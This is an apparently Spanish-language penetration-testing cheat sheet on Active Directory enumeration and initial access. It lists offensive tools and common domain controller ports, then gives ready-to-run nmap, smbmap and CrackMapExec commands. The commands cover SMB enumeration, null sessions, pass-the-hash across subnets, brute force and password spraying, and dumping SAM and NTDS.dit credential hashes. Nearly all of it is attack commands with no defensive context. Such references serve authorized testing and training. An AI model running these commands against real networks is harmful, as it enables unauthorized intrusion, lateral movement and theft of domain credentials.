[[_TOC_]]

# Enumeracion y acceso inicial

## Herramientas
* Impacket 
* Responder
* Mimikatz
* CrackMapExec
* Kerbrute
* Rubeus
* GetNPUsers & GetUserSPNs
* Invoke-Kerberoast.ps1
* PowerView.ps1
* SharpHound.ps1
* Secretsdump



## NMAP 

Al hacer un escaneo de puertos en un entorno de Active Directory en especial si el escaneo lo hacemos directamente contra el Domain Controller nos encontraremos los siguientes puertos:

* TCP/UDP port 53: DNS
* TCP/UDP port 88: Kerberos authentication
* TCP/UDP port 135: RPC
* TCP/UDP port 137-138: NetBIOS
* TCP/UDP port 389: LDAP
* TCP/UDP port 445: SMB
* TCP/UDP port 464: Kerberos password change
* TCP/UDP port 636: LDAP SSL
* TCP/UDP port 3268-3269: Global catalog

Adicionalmente dependiendo del entorno AD este puede tener varias caracteristicas y componentes asi como interactuar con diferentes servicios y aplicaciones por lo que podemos encontrarnos mas puertos comunes:

* TCP port 80: HTTP
* TCP port 443: HTTPS
* TCP port 445: SMB

De modo que tenemos dos maneras de conseguir acceso inicial al AD:
1. Autenticandonos en alguno de los servicios
2. Explotando las vulnerabilidades de alguna aplicacion o servicio.

## SMB

````
nmap -p 445 --script=smb-enum* <TARGET>  # Principalmente nos interesa enumerar usuarios
nmap -p 445  --script=smb-vuln* <TARGET> # MS17-010, MS14-025
````

* SMBMap
````bash
smbmap -H <TARGET>
````

* smbclient
````bash
smbclient -L <TARGET> -N
````

* CrackMapExec
````
# Escaneo del target 
crackmapexec smb www.secbank.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb <TARGET> -u "" up ""

# Connect to target using local account
crackmapexec smb <TARGET> -u 'test' -p 'pass123' --local-auth

# Pass the hash contra subredes
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# Fuerza bruta y Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
````

````
# Enumeración de usuarios
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --users

# Enumeracion de grupos de dominio
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --groups

# Enumeracion de usuarios locales
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --local-users

# Enumeracion de recursos compartidos locales
crackmapexec smb <TARGET> -u 'user' -p 'PASSWORD' --local-auth --shares

# Sesiones activas
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --sessions

# Usuarios logeados
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --lusers

# Politica de contraseñas
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --pass-pol
````

````
# Dump local SAM hashes
crackmapexec smb <TARGET> -u 'Administrator' -p 'PASS' --local-auth --sam

# Dump the NTDS.dit from DC using methods from secretsdump.py
crackmapexec smb <TARGET> -u UserNAme -p 'PASSWORDHERE' --ntds
````


